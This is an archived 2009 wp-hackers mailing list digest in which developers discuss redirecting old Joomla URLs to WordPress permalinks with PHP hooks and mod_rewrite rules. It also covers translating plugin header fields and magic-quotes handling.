Message-ID: <58410e2e0907182154k11aeaaffk15b80ab74d5f1111@mail.gmail.com>

Thanks scribu, but that's not working for me.  And I know exactly why...

My old permalink structure:    /category/post_id-postname.html
My new permalink structure:  /category/post_id/postname/

The problem is the old permalink structure is from Joomla.  Since I
converted the site to WordPress, it's obviously using different ID's
for each post.  Other than that it would work.  This is why I was
pretty sure I'd have to write a mod_rewrite rule rather than just a
plugin.

Any ideas?

Is there anyway to view the mod_rewrite rule that Dean's Permalink
Migration Plugin generates?  If so, I'm pretty sure I could modify it
to make it work.



On Fri, Jul 17, 2009 at 3:31 AM, scribu<scribu at gmail.com> wrote:
> Actually, I think you need this plugin:
>
> http://www.deanlee.cn/wordpress/permalinks-migration-plugin/
>
> It works great on my site.
>
>
> On Fri, Jul 17, 2009 at 2:36 AM, James Collins <james at om4.com.au> wrote:
>
>> Hi Bryan,
>> I would use the redirection plugin (
>> http://wordpress.org/extend/plugins/redirection/) to achieve this.
>>
>> Much easier than modifying your .htaccess file.
>>
>> Regards,
>>
>> James Collins
>>
>> OM4 - Website Design and Development
>> OM4.com.au | OM4Tourism.com
>>
>>
>>
>> 2009/7/17 Bryan Harley <bryanharley at gmail.com>
>>
>> > I have one type of URL that I want to 301 redirect to another. ?Can
>> > anyone help me write the mod_rewrite rule that can accomplish this?
>> >
>> > http://www.domain.com/category/postid-post-name.html
>> >
>> > http://www.domain.com/post-name/
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sun Jul 19 05:26:17 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 19 Jul 2009 00:26:17 -0500 (CDT)
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <58410e2e0907182154k11aeaaffk15b80ab74d5f1111@mail.gmail.com>
Message-ID: <1461119.3721247981174599.JavaMail.DELL-1405$@Dell-1405>

Bryan,

Since you have a one-time conversion you could write an add-hoc plugin, or maybe even add the code to your theme's functions.php file and hook "template_redirect"[1] something like this:

add_action('template_redirect','joomla_url_fix');
function joomla_url_fix() {
  $path = $_SERVER['REQUEST_URI'];
  if (preg_match('#^/category/([^-]+)-([^.]+).html$#',$path)) {
    $url_paths = array();
    // Do one line of these for each of your Joomla URLs 
    $url_paths['{joomla_url_path}'] = '{wordpress_url_path}';
    //... 
    if (isset($url_paths[$path])) {
      header('Location:' . $url_paths[$$path],true,301);
      exit();
    }
  }
}

Of course replace {joomla_url_path} and {wordpress_url_path} with the matching URL paths from Joomla and WordPress. Also, I didn't test this code so not sure if the RegEx works or that there's not another bug in it, but hopefully you know enough PHP to get the picture?

Hope this helps. BTW, congrats on graduating from Joomla to WordPress. :)

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

[1] You can out in functions.php in your theme if it is loaded before "template_redirect", but I'm not sure it is.

----- Original Message -----
From: "Bryan Harley" <bryanharley at gmail.com>
To: wp-hackers at lists.automattic.com
Sent: Sunday, July 19, 2009 12:54:01 AM GMT -05:00 US/Canada Eastern
Subject: Re: [wp-hackers] mod_rewrite help

Thanks scribu, but that's not working for me.  And I know exactly why...

My old permalink structure:    /category/post_id-postname.html
My new permalink structure:  /category/post_id/postname/

The problem is the old permalink structure is from Joomla.  Since I
converted the site to WordPress, it's obviously using different ID's
for each post.  Other than that it would work.  This is why I was
pretty sure I'd have to write a mod_rewrite rule rather than just a
plugin.

Any ideas?

Is there anyway to view the mod_rewrite rule that Dean's Permalink
Migration Plugin generates?  If so, I'm pretty sure I could modify it
to make it work.



On Fri, Jul 17, 2009 at 3:31 AM, scribu<scribu at gmail.com> wrote:
> Actually, I think you need this plugin:
>
> http://www.deanlee.cn/wordpress/permalinks-migration-plugin/
>
> It works great on my site.
>
>
> On Fri, Jul 17, 2009 at 2:36 AM, James Collins <james at om4.com.au> wrote:
>
>> Hi Bryan,
>> I would use the redirection plugin (
>> http://wordpress.org/extend/plugins/redirection/) to achieve this.
>>
>> Much easier than modifying your .htaccess file.
>>
>> Regards,
>>
>> James Collins
>>
>> OM4 - Website Design and Development
>> OM4.com.au | OM4Tourism.com
>>
>>
>>
>> 2009/7/17 Bryan Harley <bryanharley at gmail.com>
>>
>> > I have one type of URL that I want to 301 redirect to another. ?Can
>> > anyone help me write the mod_rewrite rule that can accomplish this?
>> >
>> > http://www.domain.com/category/postid-post-name.html
>> >
>> > http://www.domain.com/post-name/
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Sun Jul 19 05:29:15 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 19 Jul 2009 00:29:15 -0500 (CDT)
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <1461119.3721247981174599.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <17016724.3741247981350654.JavaMail.DELL-1405$@Dell-1405>

Oops, that one line should have been ($path, not $$path):

  header('Location:' . $url_paths[$path],true,301);

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

----- Original Message -----
From: "Mike Schinkel" <mikeschinkel at newclarity.net>
To: wp-hackers at lists.automattic.com
Sent: Sunday, July 19, 2009 1:26:17 AM GMT -05:00 US/Canada Eastern
Subject: Re: [wp-hackers] mod_rewrite help

Bryan,

Since you have a one-time conversion you could write an add-hoc plugin, or maybe even add the code to your theme's functions.php file and hook "template_redirect"[1] something like this:

add_action('template_redirect','joomla_url_fix');
function joomla_url_fix() {
  $path = $_SERVER['REQUEST_URI'];
  if (preg_match('#^/category/([^-]+)-([^.]+).html$#',$path)) {
    $url_paths = array();
    // Do one line of these for each of your Joomla URLs 
    $url_paths['{joomla_url_path}'] = '{wordpress_url_path}';
    //... 
    if (isset($url_paths[$path])) {
      header('Location:' . $url_paths[$$path],true,301);
      exit();
    }
  }
}

Of course replace {joomla_url_path} and {wordpress_url_path} with the matching URL paths from Joomla and WordPress. Also, I didn't test this code so not sure if the RegEx works or that there's not another bug in it, but hopefully you know enough PHP to get the picture?

Hope this helps. BTW, congrats on graduating from Joomla to WordPress. :)

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

[1] You can out in functions.php in your theme if it is loaded before "template_redirect", but I'm not sure it is.

----- Original Message -----
From: "Bryan Harley" <bryanharley at gmail.com>
To: wp-hackers at lists.automattic.com
Sent: Sunday, July 19, 2009 12:54:01 AM GMT -05:00 US/Canada Eastern
Subject: Re: [wp-hackers] mod_rewrite help

Thanks scribu, but that's not working for me.  And I know exactly why...

My old permalink structure:    /category/post_id-postname.html
My new permalink structure:  /category/post_id/postname/

The problem is the old permalink structure is from Joomla.  Since I
converted the site to WordPress, it's obviously using different ID's
for each post.  Other than that it would work.  This is why I was
pretty sure I'd have to write a mod_rewrite rule rather than just a
plugin.

Any ideas?

Is there anyway to view the mod_rewrite rule that Dean's Permalink
Migration Plugin generates?  If so, I'm pretty sure I could modify it
to make it work.



On Fri, Jul 17, 2009 at 3:31 AM, scribu<scribu at gmail.com> wrote:
> Actually, I think you need this plugin:
>
> http://www.deanlee.cn/wordpress/permalinks-migration-plugin/
>
> It works great on my site.
>
>
> On Fri, Jul 17, 2009 at 2:36 AM, James Collins <james at om4.com.au> wrote:
>
>> Hi Bryan,
>> I would use the redirection plugin (
>> http://wordpress.org/extend/plugins/redirection/) to achieve this.
>>
>> Much easier than modifying your .htaccess file.
>>
>> Regards,
>>
>> James Collins
>>
>> OM4 - Website Design and Development
>> OM4.com.au | OM4Tourism.com
>>
>>
>>
>> 2009/7/17 Bryan Harley <bryanharley at gmail.com>
>>
>> > I have one type of URL that I want to 301 redirect to another. ?Can
>> > anyone help me write the mod_rewrite rule that can accomplish this?
>> >
>> > http://www.domain.com/category/postid-post-name.html
>> >
>> > http://www.domain.com/post-name/
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From bryanharley at gmail.com  Sun Jul 19 06:13:57 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Sat, 18 Jul 2009 23:13:57 -0700
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <17016724.3741247981350654.JavaMail.DELL-1405$@Dell-1405>
References: <1461119.3721247981174599.JavaMail.DELL-1405$@Dell-1405>
	<17016724.3741247981350654.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <58410e2e0907182313i3e4a42dby62130299d234f5e4@mail.gmail.com>

Thanks Mike!  I actually figured out the mod_rewrite rule and it works
perfectly!  If anyone is interested this is how I did it...

RewriteRule ^category/([0-9]+)-([a-zA-Z0-9-]+).html$          /$2
[R=301,L,NC]

And of course I changed "category" to the name of the category, and
repeated for each category.

I've been a loyal WordPress user since 2002. :)   This was for a
client project, moving from Joomla to WordPress.  I'm glad they saw
the light.


On Sat, Jul 18, 2009 at 10:29 PM, Mike
Schinkel<mikeschinkel at newclarity.net> wrote:
> Oops, that one line should have been ($path, not $$path):
>
> ?header('Location:' . $url_paths[$path],true,301);
>
> -Mike Schinkel
> Custom Wordpress Plugins
> http://mikeschinkel.com/custom-wordpress-plugins
>
> ----- Original Message -----
> From: "Mike Schinkel" <mikeschinkel at newclarity.net>
> To: wp-hackers at lists.automattic.com
> Sent: Sunday, July 19, 2009 1:26:17 AM GMT -05:00 US/Canada Eastern
> Subject: Re: [wp-hackers] mod_rewrite help
>
> Bryan,
>
> Since you have a one-time conversion you could write an add-hoc plugin, or maybe even add the code to your theme's functions.php file and hook "template_redirect"[1] something like this:
>
> add_action('template_redirect','joomla_url_fix');
> function joomla_url_fix() {
> ?$path = $_SERVER['REQUEST_URI'];
> ?if (preg_match('#^/category/([^-]+)-([^.]+).html$#',$path)) {
> ? ?$url_paths = array();
> ? ?// Do one line of these for each of your Joomla URLs
> ? ?$url_paths['{joomla_url_path}'] = '{wordpress_url_path}';
> ? ?//...
> ? ?if (isset($url_paths[$path])) {
> ? ? ?header('Location:' . $url_paths[$$path],true,301);
> ? ? ?exit();
> ? ?}
> ?}
> }
>
> Of course replace {joomla_url_path} and {wordpress_url_path} with the matching URL paths from Joomla and WordPress. Also, I didn't test this code so not sure if the RegEx works or that there's not another bug in it, but hopefully you know enough PHP to get the picture?
>
> Hope this helps. BTW, congrats on graduating from Joomla to WordPress. :)
>
> -Mike Schinkel
> Custom Wordpress Plugins
> http://mikeschinkel.com/custom-wordpress-plugins
>
> [1] You can out in functions.php in your theme if it is loaded before "template_redirect", but I'm not sure it is.
>
> ----- Original Message -----
> From: "Bryan Harley" <bryanharley at gmail.com>
> To: wp-hackers at lists.automattic.com
> Sent: Sunday, July 19, 2009 12:54:01 AM GMT -05:00 US/Canada Eastern
> Subject: Re: [wp-hackers] mod_rewrite help
>
> Thanks scribu, but that's not working for me. ?And I know exactly why...
>
> My old permalink structure: ? ?/category/post_id-postname.html
> My new permalink structure: ?/category/post_id/postname/
>
> The problem is the old permalink structure is from Joomla. ?Since I
> converted the site to WordPress, it's obviously using different ID's
> for each post. ?Other than that it would work. ?This is why I was
> pretty sure I'd have to write a mod_rewrite rule rather than just a
> plugin.
>
> Any ideas?
>
> Is there anyway to view the mod_rewrite rule that Dean's Permalink
> Migration Plugin generates? ?If so, I'm pretty sure I could modify it
> to make it work.
>
>
>
> On Fri, Jul 17, 2009 at 3:31 AM, scribu<scribu at gmail.com> wrote:
>> Actually, I think you need this plugin:
>>
>> http://www.deanlee.cn/wordpress/permalinks-migration-plugin/
>>
>> It works great on my site.
>>
>>
>> On Fri, Jul 17, 2009 at 2:36 AM, James Collins <james at om4.com.au> wrote:
>>
>>> Hi Bryan,
>>> I would use the redirection plugin (
>>> http://wordpress.org/extend/plugins/redirection/) to achieve this.
>>>
>>> Much easier than modifying your .htaccess file.
>>>
>>> Regards,
>>>
>>> James Collins
>>>
>>> OM4 - Website Design and Development
>>> OM4.com.au | OM4Tourism.com
>>>
>>>
>>>
>>> 2009/7/17 Bryan Harley <bryanharley at gmail.com>
>>>
>>> > I have one type of URL that I want to 301 redirect to another. ?Can
>>> > anyone help me write the mod_rewrite rule that can accomplish this?
>>> >
>>> > http://www.domain.com/category/postid-post-name.html
>>> >
>>> > http://www.domain.com/post-name/
>>> > _______________________________________________
>>> > wp-hackers mailing list
>>> > wp-hackers at lists.automattic.com
>>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> http://scribu.net
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sun Jul 19 06:23:37 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 19 Jul 2009 02:23:37 -0400
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <58410e2e0907182313i3e4a42dby62130299d234f5e4@mail.gmail.com>
References: <1461119.3721247981174599.JavaMail.DELL-1405$@Dell-1405>
	<17016724.3741247981350654.JavaMail.DELL-1405$@Dell-1405>
	<58410e2e0907182313i3e4a42dby62130299d234f5e4@mail.gmail.com>
Message-ID: <559C28D7-6DC1-40CA-8928-A8E97555EBF8@newclarity.net>

 From your earlier email I was following your requirement of different  
IDs embedded in the URL paths for Joomla and for WordPress.  But your  
solution is better. Good deal.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/




On Jul 19, 2009, at 2:13 AM, Bryan Harley wrote:

> Thanks Mike!  I actually figured out the mod_rewrite rule and it works
> perfectly!  If anyone is interested this is how I did it...
>
> RewriteRule ^category/([0-9]+)-([a-zA-Z0-9-]+).html$          /$2
> [R=301,L,NC]
>
> And of course I changed "category" to the name of the category, and
> repeated for each category.
>
> I've been a loyal WordPress user since 2002. :)   This was for a
> client project, moving from Joomla to WordPress.  I'm glad they saw
> the light.
>
>
> On Sat, Jul 18, 2009 at 10:29 PM, Mike
> Schinkel<mikeschinkel at newclarity.net> wrote:
>> Oops, that one line should have been ($path, not $$path):
>>
>>  header('Location:' . $url_paths[$path],true,301);
>>
>> -Mike Schinkel
>> Custom Wordpress Plugins
>> http://mikeschinkel.com/custom-wordpress-plugins
>>
>> ----- Original Message -----
>> From: "Mike Schinkel" <mikeschinkel at newclarity.net>
>> To: wp-hackers at lists.automattic.com
>> Sent: Sunday, July 19, 2009 1:26:17 AM GMT -05:00 US/Canada Eastern
>> Subject: Re: [wp-hackers] mod_rewrite help
>>
>> Bryan,
>>
>> Since you have a one-time conversion you could write an add-hoc  
>> plugin, or maybe even add the code to your theme's functions.php  
>> file and hook "template_redirect"[1] something like this:
>>
>> add_action('template_redirect','joomla_url_fix');
>> function joomla_url_fix() {
>>  $path = $_SERVER['REQUEST_URI'];
>>  if (preg_match('#^/category/([^-]+)-([^.]+).html$#',$path)) {
>>    $url_paths = array();
>>    // Do one line of these for each of your Joomla URLs
>>    $url_paths['{joomla_url_path}'] = '{wordpress_url_path}';
>>    //...
>>    if (isset($url_paths[$path])) {
>>      header('Location:' . $url_paths[$$path],true,301);
>>      exit();
>>    }
>>  }
>> }
>>
>> Of course replace {joomla_url_path} and {wordpress_url_path} with  
>> the matching URL paths from Joomla and WordPress. Also, I didn't  
>> test this code so not sure if the RegEx works or that there's not  
>> another bug in it, but hopefully you know enough PHP to get the  
>> picture?
>>
>> Hope this helps. BTW, congrats on graduating from Joomla to  
>> WordPress. :)
>>
>> -Mike Schinkel
>> Custom Wordpress Plugins
>> http://mikeschinkel.com/custom-wordpress-plugins
>>
>> [1] You can out in functions.php in your theme if it is loaded  
>> before "template_redirect", but I'm not sure it is.
>>
>> ----- Original Message -----
>> From: "Bryan Harley" <bryanharley at gmail.com>
>> To: wp-hackers at lists.automattic.com
>> Sent: Sunday, July 19, 2009 12:54:01 AM GMT -05:00 US/Canada Eastern
>> Subject: Re: [wp-hackers] mod_rewrite help
>>
>> Thanks scribu, but that's not working for me.  And I know exactly  
>> why...
>>
>> My old permalink structure:    /category/post_id-postname.html
>> My new permalink structure:  /category/post_id/postname/
>>
>> The problem is the old permalink structure is from Joomla.  Since I
>> converted the site to WordPress, it's obviously using different ID's
>> for each post.  Other than that it would work.  This is why I was
>> pretty sure I'd have to write a mod_rewrite rule rather than just a
>> plugin.
>>
>> Any ideas?
>>
>> Is there anyway to view the mod_rewrite rule that Dean's Permalink
>> Migration Plugin generates?  If so, I'm pretty sure I could modify it
>> to make it work.
>>
>>
>>
>> On Fri, Jul 17, 2009 at 3:31 AM, scribu<scribu at gmail.com> wrote:
>>> Actually, I think you need this plugin:
>>>
>>> http://www.deanlee.cn/wordpress/permalinks-migration-plugin/
>>>
>>> It works great on my site.
>>>
>>>
>>> On Fri, Jul 17, 2009 at 2:36 AM, James Collins <james at om4.com.au>  
>>> wrote:
>>>
>>>> Hi Bryan,
>>>> I would use the redirection plugin (
>>>> http://wordpress.org/extend/plugins/redirection/) to achieve this.
>>>>
>>>> Much easier than modifying your .htaccess file.
>>>>
>>>> Regards,
>>>>
>>>> James Collins
>>>>
>>>> OM4 - Website Design and Development
>>>> OM4.com.au | OM4Tourism.com
>>>>
>>>>
>>>>
>>>> 2009/7/17 Bryan Harley <bryanharley at gmail.com>
>>>>
>>>>> I have one type of URL that I want to 301 redirect to another.   
>>>>> Can
>>>>> anyone help me write the mod_rewrite rule that can accomplish  
>>>>> this?
>>>>>
>>>>> http://www.domain.com/category/postid-post-name.html
>>>>>
>>>>> http://www.domain.com/post-name/
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>>>
>>> --
>>> http://scribu.net
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From zz.worklists at googlemail.com  Sun Jul 19 09:59:45 2009
From: zz.worklists at googlemail.com (james smith)
Date: Sun, 19 Jul 2009 10:59:45 +0100
Subject: [wp-hackers] including 'post tags' box in custom form
Message-ID: <3e06c58d0907190259x1888a317yd8655b1ca1ac8c88@mail.gmail.com>

Hi

I am making a site with content types which have a 'custom entry' form, i.e.
not using the regular page/post form.

I would like to be able to give the user the same form element for tagging
their posts as you get in the regular post/page form

is there a function that I can call that can add the 'post tags' box, with
the user-friendly functions that it has on the post page?

have checked docs, but don't seem to be coming up with anything.

thanks for any help/tips/pointers

James

From heiko.rabe at code-styling.de  Sun Jul 19 13:54:23 2009
From: heiko.rabe at code-styling.de (Heiko Rabe)
Date: Sun, 19 Jul 2009 15:54:23 +0200
Subject: [wp-hackers] wordpress.org *.pot file feature for plugins gets
	broken by PoEdit
Message-ID: <4A63258F.2020300@code-styling.de>

Today i discovered, that plugin header fields (shown at plugin install 
pages) can be translated too.
This only can be done, if the *.pot file will be used directly the 
service of wordpress.org is able to created.
Any attempt to rescan the sources through PoEdit wipe out this fields as 
obsolete!

Example out of "custom-field-images" plugin *.pot file:

#. Plugin URI of an extension
msgid "http://scribu.net/wordpress/custom-field-images"
msgstr ""

#. Description of an extension
msgid "Easily associate any image to a post and display it in post 
excerpts, feeds etc."
msgstr ""

#. Author of an extension
msgid "scribu"
msgstr ""

#. Author URI of an extension
msgid "http://scribu.net/"
msgstr ""

This dissenting message entry creation is not standardized and won't 
work with normal gettext pasing applications.
There should be introduced a safe way this can also be handled by 
re-scanning with gettext applications, otherwise this feature is worthless.
One option would be a section of code only for purpose of getting this 
right by gettext processors like:

function my_plugin_data($plugin_data) {
    $plugin['Name'] => __('....', 'custom-field-images'),
    $plugin['Title'] => __('....', 'custom-field-images'),
    $plugin['PluginURI'] => __('....', 'custom-field-images'),
    $plugin['Description'] =>__('....', 'custom-field-images'),
    $plugin['Author'] => __('....', 'custom-field-images'),
    $plugin['AuthorURI'] => __('....', 'custom-field-images'),
    $plugin['Version'] => __('....', 'custom-field-images'),
    $plugin['TextDomain'] => __('....', 'custom-field-images') ,
    $plugin['DomainPath'] => __('....', 'custom-field-images')
    return $plugin_data;
}
add_filter('wp_plugin_data-' .'custom-field-images', 'my_plugin_data');

I have left the message texts as '....' just for illustration.
If the file /wp-admin/includes/plugins.php would get patched, this can 
be requested by apply_filter() calls for active plugins and also works 
for not loaded plugins the current way.

But the goal is, that gettext processors now normally been able to find 
those translations because they are normal part of gettext detection.
Anyone would be able to rescan a plugin (as example if i gets modified 
and/or rewritten) without loosing this plugin field translations.

This is a first try to cover up this issue, it need not to be the best 
so far solution but it is one.

What's your opinion about ?

regards

Heiko Rabe
(www.code-styling.de)



From heiko.rabe at code-styling.de  Sun Jul 19 14:55:01 2009
From: heiko.rabe at code-styling.de (Heiko Rabe)
Date: Sun, 19 Jul 2009 16:55:01 +0200
Subject: [wp-hackers] wordpress.org *.pot file feature for plugins gets
 broken by PoEdit
In-Reply-To: <4A63258F.2020300@code-styling.de>
References: <4A63258F.2020300@code-styling.de>
Message-ID: <4A6333C5.8090107@code-styling.de>

Sorry, litte mistake at code but for sure it was thought as $plugin_data 
instead of $plugin :-)

function my_plugin_data($plugin_data) {
   $plugin_data['Name'] => __('....', 'custom-field-images'),
   $plugin_data['Title'] => __('....', 'custom-field-images'),
   $plugin_data['PluginURI'] => __('....', 'custom-field-images'),
   $plugin_data['Description'] =>__('....', 'custom-field-images'),
   $plugin_data['Author'] => __('....', 'custom-field-images'),
   $plugin_data['AuthorURI'] => __('....', 'custom-field-images'),
   $plugin_data['Version'] => __('....', 'custom-field-images'),
   $plugin_data['TextDomain'] => __('....', 'custom-field-images') ,
   $plugin_data['DomainPath'] => __('....', 'custom-field-images')
   return $plugin_data;
}
add_filter('wp_plugin_data-' .'custom-field-images', 'my_plugin_data');

But nevertherless the problem description is still valid, verfied with 
PoEdit (lost this entries as obsolete) and a lot of online/ofline 
translation systems able to scan sources also loosing this entries.

regards

Heiko Rabe
(www.code-styling.de)
> Today i discovered, that plugin header fields (shown at plugin install 
> pages) can be translated too.
> This only can be done, if the *.pot file will be used directly the 
> service of wordpress.org is able to created.
> Any attempt to rescan the sources through PoEdit wipe out this fields 
> as obsolete!
>
> Example out of "custom-field-images" plugin *.pot file:
>
> #. Plugin URI of an extension
> msgid "http://scribu.net/wordpress/custom-field-images"
> msgstr ""
>
> #. Description of an extension
> msgid "Easily associate any image to a post and display it in post 
> excerpts, feeds etc."
> msgstr ""
>
> #. Author of an extension
> msgid "scribu"
> msgstr ""
>
> #. Author URI of an extension
> msgid "http://scribu.net/"
> msgstr ""
>
> This dissenting message entry creation is not standardized and won't 
> work with normal gettext pasing applications.
> There should be introduced a safe way this can also be handled by 
> re-scanning with gettext applications, otherwise this feature is 
> worthless.
> One option would be a section of code only for purpose of getting this 
> right by gettext processors like:
>
> function my_plugin_data($plugin_data) {
>    $plugin['Name'] => __('....', 'custom-field-images'),
>    $plugin['Title'] => __('....', 'custom-field-images'),
>    $plugin['PluginURI'] => __('....', 'custom-field-images'),
>    $plugin['Description'] =>__('....', 'custom-field-images'),
>    $plugin['Author'] => __('....', 'custom-field-images'),
>    $plugin['AuthorURI'] => __('....', 'custom-field-images'),
>    $plugin['Version'] => __('....', 'custom-field-images'),
>    $plugin['TextDomain'] => __('....', 'custom-field-images') ,
>    $plugin['DomainPath'] => __('....', 'custom-field-images')
>    return $plugin_data;
> }
> add_filter('wp_plugin_data-' .'custom-field-images', 'my_plugin_data');
>
> I have left the message texts as '....' just for illustration.
> If the file /wp-admin/includes/plugins.php would get patched, this can 
> be requested by apply_filter() calls for active plugins and also works 
> for not loaded plugins the current way.
>
> But the goal is, that gettext processors now normally been able to 
> find those translations because they are normal part of gettext 
> detection.
> Anyone would be able to rescan a plugin (as example if i gets modified 
> and/or rewritten) without loosing this plugin field translations.
>
> This is a first try to cover up this issue, it need not to be the best 
> so far solution but it is one.
>
> What's your opinion about ?
>
> regards
>
> Heiko Rabe
> (www.code-styling.de)
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


From wp-hackers at striderweb.com  Sun Jul 19 15:37:53 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sun, 19 Jul 2009 10:37:53 -0500
Subject: [wp-hackers] wordpress.org *.pot file feature for plugins gets
	broken by PoEdit
In-Reply-To: <4A63258F.2020300@code-styling.de>
References: <4A63258F.2020300@code-styling.de>
Message-ID: <9DAEA0C1-71C8-4C62-81F9-933AAD713E7F@striderweb.com>

Am I correct in thinking this would only work if the plugin is  
active?  This info needs to work for inactive plugins too.  Also it  
seems to require double-entry of data, which to me is a bad idea.

Stephen

On Jul 19, 2009, at 8:54 AM, Heiko Rabe wrote:

> ...

> This dissenting message entry creation is not standardized and won't  
> work with normal gettext pasing applications.
> There should be introduced a safe way this can also be handled by re- 
> scanning with gettext applications, otherwise this feature is  
> worthless.
> One option would be a section of code only for purpose of getting  
> this right by gettext processors like:
>
> function my_plugin_data($plugin_data) {
>   $plugin['Name'] => __('....', 'custom-field-images'),
>   $plugin['Title'] => __('....', 'custom-field-images'),
>   $plugin['PluginURI'] => __('....', 'custom-field-images'),
>   $plugin['Description'] =>__('....', 'custom-field-images'),
>   $plugin['Author'] => __('....', 'custom-field-images'),
>   $plugin['AuthorURI'] => __('....', 'custom-field-images'),
>   $plugin['Version'] => __('....', 'custom-field-images'),
>   $plugin['TextDomain'] => __('....', 'custom-field-images') ,
>   $plugin['DomainPath'] => __('....', 'custom-field-images')
>   return $plugin_data;
> }
> add_filter('wp_plugin_data-' .'custom-field-images',  
> 'my_plugin_data');

From m at mullenweg.com  Sun Jul 19 16:08:48 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Sun, 19 Jul 2009 09:08:48 -0700
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <6dbcd2670907152043oa49ec9fy47c927295b4e4cf0@mail.gmail.com>
References: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com>	<b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com>	<BB1819DD-1A08-47BD-843B-57B9FEB3228B@daivmowbray.com>	<6dbcd2670907150540h331fec17tbf685605896bad9b@mail.gmail.com>	<b88434820907151942l4d331079u6a8874ae13f966ca@mail.gmail.com>	<b88434820907151943r3aea796bk47bc662cb67e1c4b@mail.gmail.com>
	<6dbcd2670907152043oa49ec9fy47c927295b4e4cf0@mail.gmail.com>
Message-ID: <4A634510.3000100@mullenweg.com>

On 7/15/2009 8:43 PM, Will Anderson wrote:
> This is why Magic Quotes are being deprecated. They're useful for software
> that doesn't do its own escaping, but software like WordPress does, so Magic
> Quotes end up being more of a pain than they're worth.

We attempt to turn magic quotes off at the top of wp-settings.php:

set_magic_quotes_runtime(0);
@ini_set('magic_quotes_sybase', 0);

If you're seeing extra quotes somewhere, it may be a bug.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Sun Jul 19 16:11:56 2009
